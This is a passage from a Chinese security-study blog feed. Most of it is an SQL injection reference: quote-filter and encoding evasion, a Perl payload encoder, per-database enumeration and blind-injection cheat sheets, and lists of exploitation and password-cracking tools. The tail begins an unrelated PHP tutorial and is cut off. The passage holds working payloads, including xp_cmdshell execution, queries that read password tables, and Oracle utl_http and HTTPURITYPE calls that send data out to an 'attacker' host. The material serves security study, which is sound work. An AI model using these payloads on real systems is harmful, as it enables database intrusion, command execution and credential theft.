punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"避开输入验证过滤器\"><a href=\"#避开输入验证过滤器\" class=\"headerlink\" title=\"避开输入验证过滤器\"></a>避开输入验证过滤器</h3><h4 id=\"引号过滤器\"><a href=\"#引号过滤器\" class=\"headerlink\" title=\"引号过滤器\"></a>引号过滤器</h4><p>不使用引号字符表示字符串</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>平   台</td>\n<td>查  询</td>\n</tr>\n<tr>\n<td>Microsoft SQL Server</td>\n<td><code>SELECT char(0x41) + char(0x42) + char(0x43);</code></td>\n</tr>\n<tr>\n<td>MySQL Server</td>\n<td><code>SELECT char (65,66,67);</code><br><code>  SELECT 0x414243;</code></td>\n</tr>\n<tr>\n<td>Oracle</td>\n<td>`SELECT chr(65)</td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td>`SELECT chr(65)</td>\n</tr>\n</tbody></table>\n<p>Microsoft SQL Server还支持在变量中构造查询，然后调用EXEC来执行它。</p>\n<p>创建了一个名为@q的变量，并借助一个十六进制编码的字符串将SELECT’ABC’查询赋值给该变量：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@q</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@q</span><span class=\"token operator\">=</span><span class=\"token number\">0x53454c454354202741424327</span>\n<span class=\"token keyword\">EXEC</span><span class=\"token punctuation\">(</span><span class=\"token variable\">@q</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>采用该技术可以在不向应用程序提交任何引号字符的前提下，执行任意查询。可以使用下列Perl脚本并借助该技术来自动编码SQL语句：</p>\n<pre class=\"line-numbers language-perl\" data-language=\"perl\"><code class=\"language-perl\"><span class=\"token comment\">#!/usr/bin/perl</span>\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"Enter SQL query to encode:\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$teststr</span><span class=\"token operator\">=</span><span class=\"token filehandle symbol\">&lt;STDIN&gt;</span><span class=\"token punctuation\">;</span>chomp <span class=\"token variable\">$teststr</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$hardcoded_sql</span> <span class=\"token operator\">=</span>\n<span class=\"token string\">'declare @q varchar(8000)'</span><span class=\"token operator\">.</span>\n<span class=\"token string\">'select @q=0x***'</span><span class=\"token operator\">.</span>\n<span class=\"token string\">'exec(@q)'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$prepared</span> <span class=\"token operator\">=</span> encode_sql<span class=\"token punctuation\">(</span><span class=\"token variable\">$teststr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$hardcoded_sql</span> <span class=\"token operator\">=~</span><span class=\"token regex\">s/\\*\\*\\*/$prepared/g</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"\"</span><span class=\"token operator\">\\</span>n<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>Encoded SQL<span class=\"token punctuation\">:</span><span class=\"token operator\">\\</span>n<span class=\"token operator\">\\</span>n<span class=\"token string\">\";\nprint $hardcoded_sql .\"</span><span class=\"token operator\">\\</span>n<span class=\"token string\">\";\nsub encode_sql{\n@subvar=@_;\nmy $sqlstr =$subvar[0];\n@ASCII = unpack(\"</span>C<span class=\"token operator\">*</span>\"<span class=\"token punctuation\">,</span><span class=\"token variable\">$sqlstr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token variable\">$line</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">@ASCII</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token variable\">$encoded</span> <span class=\"token operator\">=</span> sprintf<span class=\"token punctuation\">(</span><span class=\"token string\">'%lx'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$line</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$encoded_command</span> <span class=\"token operator\">.=</span><span class=\"token variable\">$encoded</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">return</span> <span class=\"token variable\">$encoded_command</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"HTTP-编码\"><a href=\"#HTTP-编码\" class=\"headerlink\" title=\"HTTP 编码\"></a>HTTP 编码</h4><p>有时可以使用外来编码标准或者借助双重编码来编码输入，以避开那些拒绝已知不良字符 (通常称为黑名单)的输入验证过滤器。</p>\n<p>编码后的SQL元字符</p>\n<table>\n<thead>\n<tr>\n<th>字   符</th>\n<th>编码后的变量</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>‘</td>\n<td>%27<br>%2527<br>%u0027<br>%u02b9<br>%ca%b9</td>\n</tr>\n<tr>\n<td>“</td>\n<td>%22<br>%2522<br>%u0022<br>%uff02<br>%ef%bc%82</td>\n</tr>\n<tr>\n<td>;</td>\n<td>%3b<br>%253b<br>%u0003b<br>%ufflb<br>%ef%bc%9b</td>\n</tr>\n<tr>\n<td>(</td>\n<td>%28<br>%2528<br>%u0028<br>%uff08<br>%ef%bc%88</td>\n</tr>\n<tr>\n<td>)</td>\n<td>%29<br>%2529<br>%u0029<br>%uff09<br>%ef%bc%89</td>\n</tr>\n<tr>\n<td>［空格］</td>\n<td>%20<br>%2520<br>%u0020<br>%ff00<br>%c0%a0</td>\n</tr>\n</tbody></table>\n<h3 id=\"排查SQL注入攻击\"><a href=\"#排查SQL注入攻击\" class=\"headerlink\" title=\"排查SQL注入攻击\"></a>排查<strong>SQL</strong>注入攻击</h3><p>排查SQL注入时的参考资料</p>\n<table>\n<thead>\n<tr>\n<th>解决方案</th>\n<th>错误/挑战</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>挑战<br>执行一次UNION SELECT攻击，其原始查询用于检索image类型的列。<br>错误消息<br> <code>Image is incompatible with int/ The image data type cannot be selected as DISTINCT because it is not compatible.</code></td>\n<td>将<code>UNION SELECT</code>语句修改成读<code>UNION ALL SELECT</code><br>这样能解决当<code>UNION SELECT</code>尝试与image数据类型进行比较操作时出现的相关问题。<br>例如：<code>UNION ALL SELECT null,null,null</code></td>\n</tr>\n<tr>\n<td>挑战<br>注入ORDER BY子句<br>注入的数据位于ORDER BY子句右边。许多常用的技巧（比如UNION SELECT）将不起作用。<br>本例执行下列SQL查询，其中攻击者的数据是注入点：<code>SELECT  FROM products GROUP BY attackers data DESC</code></td>\n<td>Microsoft SQL Server <br>Microsoft SQL Server支持使用分号(;)作为每个新查询的堆叠查询的开始。可以按下列方式来实施多种攻击，比如基于时间延迟的数据检索和扩展存储过程的执行：<br><code>ORDER BY 1；EXEC master..xp_cmdshell'cmd'</code><br>还可以利用Microsoft SQL Server并通过错误消息来返回查询结果数据。注入ORDER BY子句时，可以使用下列语法：<br><code>ORDER BY (1/(@@version)); -- 返回版本号</code><br><code>ORDER BY 1/(SELECT TOP 1 name FROM sysobjects WHERE xtype='U');--从sysobjects返回名称</code><br>MySQL Server<br>可以在ORDER BY子句中使用基于时间延迟的SQL盲注。如果当前用户为root@localhost，那么下面的例子会触发时间延迟：<br><code>ORDER BY(IF((SELECT user()='root@localhost'),sleep(2),1));</code><br>Oracle可以使用utl_http包并通过攻击者选择的任何TCP端口来建立向外的HTTP连接。接下来的ORDER BY子句通过端口1000与主机攻击者建立了一条HTTP连接。<br>该HTTP请求在请求路径中包含了Oracle的版本标志：`ORDER BY utl_http.request(‘<a href=\"http://attacker:1000/\">http://attacker:1000/</a>‘</td>\n</tr>\n<tr>\n<td>挑战<br>因为删除了公共权限，所以ut http无法起作用。<br>错误消息<br><code>ORA-00904 invalid identifier</code></td>\n<td>许多Oracle安全指南建议从utl_http包中删除公共权限。不过，很多人忽视这样一个事实可使用 HTTPURITYPE对象类型实现相同的目的，而且同样能被公共权限访问到。<br>`SELECT HTTPURITYPE(‘<a href=\"http://attacker:1000/\">http://attacker:1000/</a>‘</td>\n</tr>\n<tr>\n<td>挑战<br>utl inaddr不起作用。<br>存在多种原因，比如版本11中的访问控制列表（ACL），权限已经被撤销以及未安装Java等。<br>错误消息<br><code>ORA-00904 invalid identifier ORA-24247 network access denied by access control list ACL）-11g ORA-29540 oracle/plsql/net/InternetAddress</code></td>\n<td>在可以控制错误消息内容的位置使用不同的函数。根据数据库版本及安装组件的不同，下面是候选函数的一个列表：<br><code>ORDER BY ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE rownum=1),null,null) ORDER BY SYS.DBMS_AW_XML.READAWMETADATA((SELECT banner FROM v$version WHERE rownum=1),null) ORDER BY CTXSYS.DRITHSX.SN((SELECT banner FROM v$version WHERE rownum=1),user)ORDER BY CTXSYS.CTX_REPORT.TOKEN_TYPE(user,(SELECT banner FROM v$version WHERE rownum=1))</code></td>\n</tr>\n<tr>\n<td>挑战<br>执行针对MySQL数据库的UNION SELECT攻击时收到<code>illegal mix of collations</code>消息。<br>错误消息<br><code>illegal mix of collations(latinl_swedish_ci,IMPLICIT) and(utf8_general_ci,SYSCONST)for operation 'UNION'</code></td>\n<td>可以使用CAST函数解决该错误。<br>例如：<br><code>UNION SELECT user(),null,null;</code><br>变为：<br><code>UNION SELECT CAST(user() ASchar),null,null;</code></td>\n</tr>\n<tr>\n<td>挑战<br>执行针对Microsoft SQL Server数据库的UNION SELECT攻击时收到<code>collation conflict\"</code>消息。<br>错误消息<br><code>Cannot resolve collation conflict for column 2 in SELECT statement</code></td>\n<td>要想解决该错误，一种方法是从数据库读取Collation属性，然后在查询中使用。在下面的例子中，我们执行<code>UNION ALL SELECT</code>查询来检索sysobject表中的name列。<br>步骤1：检索collation的值<br><code>UNION ALL SELECT SERVERPROPERTY（'Collation'），null FROM sysobjects</code><br>本例中，我们将Collation属性设置为<code>SQL_Latinl_General_CPl_CI_AS</code><br>步骤2：在<code>UNION SELECT</code>中实现collation的值<code>UNION ALL SELECT 1,Name collate SQL Latinl General CPl_CI_AS,null FROM sysobjects</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"其他平台上的SQL注入\"><a href=\"#其他平台上的SQL注入\" class=\"headerlink\" title=\"其他平台上的SQL注入\"></a>其他平台上的<strong>SQL</strong>注入</h3><h4 id=\"DB2备忘单\"><a href=\"#DB2备忘单\" class=\"headerlink\" title=\"DB2备忘单\"></a>DB2备忘单</h4><p>在与Web应用集成的众多数据库中，IBM的DB2数据库服务器可能是其中最不流行的一种数据库平台。不过，Linux、UNIX和Windows版本(DB2 LUW)正日渐流行。</p>\n<ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取DB2数据库的配置信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版本</td>\n<td><code>SELECT versionnumber, version_timestamp  FROM sysibm.sysversions;</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT user FROM sysibm.sysdummy1;</code><br><code>SELECT session_user FROM sysibm.sysdummyl;</code><br><code> SELECT system_user FROM sysibm.sysdummyl;</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>SELECT grantee FROM syscat.dbauth;</code></td>\n</tr>\n<tr>\n<td>当前用户权限</td>\n<td><code>SELECT * FROM syscat.dbauth WHERE  grantee =user;</code><br><code> SELECT * FROM syscat.tabauth WHERE grantee =user;</code><br><code> SELECT *  FROM syscat.tabauth;</code></td>\n</tr>\n</tbody></table>\n<p>提取DB2数据库的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>当前数据库</td>\n<td><code>SELECT current_server FROM sysibm.sysdummyl;</code></td>\n</tr>\n<tr>\n<td>列出数据库</td>\n<td><code>SELECT schemaname FROM syscat.schemata;</code></td>\n</tr>\n<tr>\n<td>列出表</td>\n<td><code>SELECT name FROM sysibm.systables;</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td><code>SELECT name, tbname, coltype FROM sysbibm.syscolumns;</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL盲注函数：DB2</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查  询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LENGTH()</code></td>\n</tr>\n<tr>\n<td>从给定字符串中提取子串</td>\n<td><code>SUBSTRING(string,offset,length) FROM  sysibm.sysdummyl;</code></td>\n</tr>\n<tr>\n<td>字符串(‘ABC’)不带单引号的表示方式</td>\n<td>`SELECT CHR(65)</td>\n</tr>\n</tbody></table>\n<h4 id=\"Informix-备忘单\"><a href=\"#Informix-备忘单\" class=\"headerlink\" title=\"Informix 备忘单\"></a>Informix 备忘单</h4><p>Informix数据库服务器也是由IBM负责经销的，相比其他数据库平台，它不是很常见。</p>\n<ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取Informix数据库的配置信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版本</td>\n<td><code>SELECT DBINFO('version','full') FROM systables WHERE tabid = 1;</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT USER FROM systables WHERE tabid = 1;</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>select usertype,username,password from sysusers;</code></td>\n</tr>\n<tr>\n<td>当前用户权限</td>\n<td><code>select tabname, tabauth, grantor, grantee FROM systabauth join systables on systables.tabid = systabauth.tabid</code></td>\n</tr>\n<tr>\n<td>数据库服务器主机名</td>\n<td><code>SELECT DBINFO('dbhostname') FROM systables WHERE tabid=1;</code></td>\n</tr>\n</tbody></table>\n<p> 提取Informix数据库的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>当前数据库</td>\n<td><code>SELECT DBSERVERNAME FROM systables WHERE tabid = 1;</code></td>\n</tr>\n<tr>\n<td>列出数据库</td>\n<td><code>SELECT name, owner FROM sysdatabases;</code></td>\n</tr>\n<tr>\n<td>列出表</td>\n<td><code>SELECT tabname FROM systables; </code><br><code> SELECT tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td><code>SELECT tabname, colname, coltype FROM  syscolumns join systables on  syscolumns.tabid = systables.tabid;</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL 盲注函数：Informix</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查  询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LENGTH()</code></td>\n</tr>\n<tr>\n<td>从给定字符串中提取子串</td>\n<td><code>SELECT SUBSTRING('ABCD' FROM 4 FOR 1) FROM  systables where tabid = 1;  --返回'D';</code></td>\n</tr>\n<tr>\n<td>字符串(‘ABC’)不带单引号的表示方式</td>\n<td>`SELECT CHR(65)</td>\n</tr>\n</tbody></table>\n<h4 id=\"Ingres-备忘单\"><a href=\"#Ingres-备忘单\" class=\"headerlink\" title=\"Ingres 备忘单\"></a>Ingres 备忘单</h4><p>Ingres是一种可以在所有主流操作系统上使用的开源数据库。</p>\n<ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取Ingres数据库的配置信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版本</td>\n<td><code>SELECT dbsminfo('version');</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT dbsminfo('system user');</code><br><code> SELECT dbsminfo('session user');</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>SELECT name, password FROM iiuser;</code></td>\n</tr>\n<tr>\n<td>当前用户权限</td>\n<td><code>SELECT dbsminfo('select_syscat');</code><br><code>SELECT dbsminfo('db_privileges');</code><br><code>SELECT  dbsminfo('current_priv_mask'); </code><br><code>SELECT dbsminfo('db_admin');</code><br><code>SELECT dbsminfo('security_priv');</code><br><code>SELECT dbsminfo('create_table'); </code><br><code>SELECT dbsminfo('create procedure');</code></td>\n</tr>\n</tbody></table>\n<p> 提取Ingres数据库的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>当前数据库</td>\n<td><code>SELECT dbmsinfo(database');</code></td>\n</tr>\n<tr>\n<td>列出表</td>\n<td><code>SELECT relid, relowner, relloc FROM iirelation WHERE relowner != '$ingres';</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td><code>SELECT column_name, column_datatype,  table_name, table_owner FROM iicolumns;</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL盲注函数：Ingres</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LENGTH()</code></td>\n</tr>\n<tr>\n<td>从给定字符串中提取子串</td>\n<td><code>SELECT substr(string, offset, length); -- </code></td>\n</tr>\n<tr>\n<td>字符串(‘ABC’)不带单引号的表示方式</td>\n<td>`SELECT chr(65)</td>\n</tr>\n</tbody></table>\n<h4 id=\"Sybase-备忘单\"><a href=\"#Sybase-备忘单\" class=\"headerlink\" title=\"Sybase 备忘单\"></a>Sybase 备忘单</h4><p>Sybase与Microsoft SQL Server共享了共同的遗产，在Microsoft SQL Server中使用的很多 方法对于Sybase同样有效，往往只须在所用命令的语法上稍加修改即可。</p>\n<ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取Sybase数据库的配置信息</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数   据</td>\n<td>查   询</td>\n</tr>\n<tr>\n<td>版本</td>\n<td><code>SELECT @@version;</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT username();</code><br><code> SELECT suser_name();</code><br><code> SELECT user;</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>SELECT name FROM master..syslogins;</code></td>\n</tr>\n<tr>\n<td>当前用户权限</td>\n<td><code>SELECT show role(); </code><br><code> EXEC sp_helprotect &lt;user&gt;;</code></td>\n</tr>\n</tbody></table>\n<p>提取Sybase数据库的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>当前数据库</td>\n<td><code>SELECT db_name();</code></td>\n</tr>\n<tr>\n<td>列出数据库</td>\n<td><code>SELECT name FROM master..sysdatabases;</code></td>\n</tr>\n<tr>\n<td>列出表</td>\n<td>列出当前数据库中的表： <br><code>SELECT name FROM sysobjects WHERE type='U'; </code><br><code>SELECT name FROM sysobjects WHERE type='V'-- 视图 </code><br>列出master数据库中的表： <br><code>SELECT name FROM master..sysobjects WHERE type= 'U';</code><br><code>SELECT name FROM  master..sysobjects WHERE type='V';</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td>列出当前数据库中tblUsers表的各个列的名称：<br><code>SELECT name FROM syscolumns WHERE  id=object_ id('tblUsers');</code><br>  列出admin数据库中tblUsers表的各个列的名称：<br><code>  SELECT  name FROM admin..syscolumns WHERE id=object_id('admin..tblUsers');</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL盲注函数：Sybase</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LEN();</code></td>\n</tr>\n<tr>\n<td>从给定字符串中提取子串</td>\n<td><code>SUBSTRING(string,offset,length);</code></td>\n</tr>\n<tr>\n<td>字符串(‘ABC’)不带单引号的表示方式</td>\n<td><code>SELECT char(65)+char(66)+char(67);</code></td>\n</tr>\n</tbody></table>\n<h4 id=\"Microsoft-Access\"><a href=\"#Microsoft-Access\" class=\"headerlink\" title=\"Microsoft Access\"></a>Microsoft Access</h4><p>Microsoft Access数据库无法很好地适应企业级应用，所以通常只在具有极小数据库需求 的应用中才会遇到。</p>\n<h3 id=\"资源\"><a href=\"#资源\" class=\"headerlink\" title=\"资源\"></a>资源</h3><h4 id=\"SQL注入白皮书\"><a href=\"#SQL注入白皮书\" class=\"headerlink\" title=\"SQL注入白皮书\"></a>SQL注入白皮书</h4><ul>\n<li>Victor Chapela 撰写的 “Advanced SQL Injection” : <a href=\"www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt\">www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt</a></li>\n<li>Chris Anley撰写的”Advanced SQL Injection in SQL Server Applications”：<a href=\"http://www.ngssoftware.com/papers/advanced_sql_injection.pdf\">www.ngssoftware.com/papers/advanced_sql_injection.pdf</a></li>\n<li>Gary O’Leary-Steele撰写的”Buffer Truncation Abuse in.NET and Microsoft SQL<br>Server”：<a href=\"http://scanner.sec-1.com/resources/bta.pdf\">http://scanner.sec-1.com/resources/bta.pdf</a></li>\n<li>Brett Moore撰写的”Access through Access”：<a href=\"http://www.insomniasec.com/publications/Access-Through-Access.pdf\">www.insomniasec.com/publications/Access-Through-Access.pdf</a></li>\n<li>Chema Alonso撰写的”Time-Based Blind SQL Injection with Heavy Queries”：<a href=\"http://technet.microsoft.com/en-us/library/cc512676.aspx\">http://technet.microsoft.com/en-us/library/cc512676.aspx</a></li>\n</ul>\n<h4 id=\"SQL注入备忘单\"><a href=\"#SQL注入备忘单\" class=\"headerlink\" title=\"SQL注入备忘单\"></a>SQL注入备忘单</h4><ul>\n<li><p>PentestMonkey.com 针对 Oracle、Microsoft SQL Server、MySQL、PostgreSQL、Ingres、DB2 和 Informix 的 SQL 注入备忘单：<a href=\"http://pentestmonkey.net/cheat-sheets/\">http://pentestmonkey.net/cheat-sheets/</a> </p>\n</li>\n<li><p>Michaeldaw.org 针对 Sybase、MySQL、OraclePostgreSQL、DB2 和 Ingres 的 SQL 注 入备忘单：<a href=\"http://michaeldaw.org/sql-injection-cheat-sheet/\">http://michaeldaw.org/sql-injection-cheat-sheet/</a></p>\n</li>\n<li><p>Ferruh Mavituna 针对 MySQL、SQL Server、PostgreSQL 和 Oracle 的 SQL 注入备忘单： <a href=\"http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/\">http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/</a></p>\n</li>\n<li><p>Ferruh Mavituna 针对 Oracle 的 SQL 注入备忘单：<a href=\"http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/\">http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/</a></p>\n</li>\n</ul>\n<h4 id=\"SQL注入利用工具\"><a href=\"#SQL注入利用工具\" class=\"headerlink\" title=\"SQL注入利用工具\"></a>SQL注入利用工具</h4><ul>\n<li><p>Absinthe 是一款基于 Windows GUI 的利用工具，支持 Microsoft SQL Server、Oracle、PostgreSQL 和 Sybase，并使用 SQL 盲注和基于错误的 SQL 注入：<a href=\"http://www.0x90.org/releases/absinthe/\">www.0x90.org/releases/absinthe/</a></p>\n</li>\n<li><p>SQLBrute是一款基于时间和错误的SQL盲注工具，支持Microsoft SQL Server和Oracle： <a href=\"https://github.com/GDSSecurity/SQLBruteo\">https://github.com/GDSSecurity/SQLBruteo</a></p>\n</li>\n<li><p>Bobcat 是一款基于 Windows GUI 的工具，支持 Microsoft SQL Server 漏洞利用：<a href=\"http://web.mac.com/nmonkee/pub/bobcat.html\">http://web.mac.com/nmonkee/pub/bobcat.html</a> </p>\n</li>\n<li><p>BSQL Hacker在SQL注入利用领域是一款相对较新的工具。是一种基于Windows的GUI 应用程序，支持Microsoft SQL Server、Oracle和MySQL,并支持SQL盲注和基于错误的 SQL 注入技术：<a href=\"http://labs.portcullis.co.uk/application/bsql-hacker/\">http://labs.portcullis.co.uk/application/bsql-hacker/</a></p>\n</li>\n<li><p>很多攻击者认为SQLMap是目前最好的SQL注入漏洞利用工具：<a href=\"http://sqlmap.source-fbrge.net/\">http://sqlmap.source- fbrge.net/</a></p>\n</li>\n<li><p>Sqlninja是一款使用Perl编写的且关注获取代码执行的Microsoft SQL注入工具：<a href=\"http://sqlninja.sourceforge.net/\">http://sqlninja.sourceforge.net/</a></p>\n</li>\n<li><p>Squeeza被作为BlackHat展示的一部分发布。它关注的是可选的通信通道，支持Microsoft SQL Server： <a href=\"http://www.sensepost.com/research/squeezao\">www.sensepost.com/research/squeezao</a></p>\n</li>\n</ul>\n<h4 id=\"口令破解工具\"><a href=\"#口令破解工具\" class=\"headerlink\" title=\"口令破解工具\"></a>口令破解工具</h4><ul>\n<li><p>Cain &amp; Abel： <a href=\"http://www.oxid.it/\">www.oxid.it</a></p>\n</li>\n<li><p>Woraauthbf： <a href=\"http://www.soonerorlater.hu/index.khtml?article_id=513\">www.soonerorlater.hu/index.khtml?article_id=513</a></p>\n</li>\n<li><p>Checkpwd: <a href=\"http://www.red-database-security.com/software/checkpwd.html\">www.red-database-security.com/software/checkpwd.html</a></p>\n</li>\n<li><p>John the Ripper： <a href=\"http://www.openwall.com/john/\">www.openwall.com/john/</a></p>\n</li>\n</ul>\n",
            "tags": [
                "sql",
                "学习"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/05/27/phps-study/",
            "url": "https://0xdadream.github.io/2021/05/27/phps-study/",
            "title": "php复习",
            "date_published": "2021-05-27T01:25:00.000Z",
            "content_html": "<h1 id=\"php-study\"><a href=\"#php-study\" class=\"headerlink\" title=\"php_study\"></a>php_study</h1><h3 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//单行注释</span>\n<span class=\"token comment\">/*\n多行注释\n*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a>变量</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">/*\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n*/</span>\n\n<span class=\"token comment\">//声明</span>\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$var1</span><span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-Type: text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 全局变量</span>\n<span class=\"token variable\">$y</span><span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">myTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$y</span><span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 局部变量</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p&gt;测试函数内变量:&lt;p&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"变量 x 为: <span class=\"token interpolation\"><span class=\"token variable\">$x</span></span>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"变量 y 为: <span class=\"token interpolation\"><span class=\"token variable\">$y</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">yourTest</span><span class=\"token punctuation\">(</span><span class=\"token 